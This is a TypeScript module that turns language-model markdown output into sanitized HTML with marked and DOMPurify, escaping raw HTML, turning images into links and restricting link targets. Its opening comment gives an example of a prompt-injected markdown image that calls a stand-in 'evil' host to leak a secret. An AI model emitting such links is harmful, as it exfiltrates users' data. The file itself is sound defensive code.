// Model output -> sanitized HTML.
//
// - marked (GFM) on its own instance; raw HTML in the source is escaped, so it
//   is shown as text and never interpreted.
// - Images are rendered as links: a prompt-injected ![x](https://evil/?q=secret)
//   would otherwise leak data the moment it renders.
// - A dedicated DOMPurify instance (its hooks never leak into other uses)
//   sanitizes the result: HTML profile only (no SVG/MathML), no inline styles,
//   links restricted to http(s)/mailto and opened in a new tab without referrer.

import createDOMPurify, { type Config, type DOMPurify } from 'dompurify';
import { Marked } from 'marked';

const ESCAPES: Record<string, string> = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
export const escapeHtml = (s: string): string => s.replace(/[&<>"']/g, (c) => ESCAPES[c] ?? c);

const SAFE_HREF = /^(?:https?:\/\/|mailto:)/i;

const md = new Marked({ gfm: true, breaks: false, async: false });
md.use({
  renderer: {
    html({ text }) {
      return escapeHtml(text);
    },
    image({ href, text }) {
      const label = text ? `Imatge: ${text}` : 'Imatge';
      return `<a href="${escapeHtml(href)}" class="md-image-link">${escapeHtml(label)}</a>`;
    },
  },
});

const PURIFY_CONFIG: Config = {
  USE_PROFILES: { html: true },
  FORBID_TAGS: [
    'img', 'picture', 'video', 'audio', 'source', 'track', 'style', 'link', 'meta', 'base', 'form', 'input',
    'button', 'textarea', 'select', 'option', 'iframe', 'frame', 'frameset', 'object', 'embed', 'template',
    'dialog', 'svg', 'math', 'canvas', 'noscript',
  ],
  FORBID_ATTR: ['style', 'srcset', 'id', 'name', 'target', 'formaction', 'action', 'background', 'poster'],
  ALLOW_DATA_ATTR: false,
  ALLOW_ARIA_ATTR: false,
};

let purifier: DOMPurify | null = null;

function getPurifier(): DOMPurify {
  if (purifier) return purifier;
  const p = createDOMPurify(window);
  p.addHook('afterSanitizeAttributes', (node) => {
    if (node.nodeName !== 'A') return;
    const el = node as Element;
    const href = el.getAttribute('href')?.trim() ?? '';
    if (!SAFE_HREF.test(href)) {
      el.removeAttribute('href');
      return;
    }
    el.setAttribute('target', '_blank');
    el.setAttribute('rel', 'noopener noreferrer nofollow');
    el.setAttribute('referrerpolicy', 'no-referrer');
  });
  purifier = p;
  return p;
}

/** Render untrusted markdown to safe HTML. */
export function renderMarkdown(src: string): string {
  if (!src) return '';
  const html = md.parse(src, { async: false });
  return getPurifier().sanitize(html, PURIFY_CONFIG);
}

/**
 * Critiques are meant to be bullets; models sometimes answer with plain lines.
 * Turn plain lines into a list so they read the same.
 */
export function critiqueMarkdown(src: string): string {
  const text = src.trim();
  if (!text) return '';
  if (/^\s*(?:[-*+]|\d+[.)])\s/m.test(text)) return text;
  const lines = text.split(/\n+/).map((l) => l.trim()).filter(Boolean);
  return lines.length > 1 ? lines.map((l) => `- ${l}`).join('\n') : text;
}

/** True when the rendered HTML has code blocks worth highlighting. */
export const hasCodeBlocks = (html: string): boolean => html.includes('<pre>');
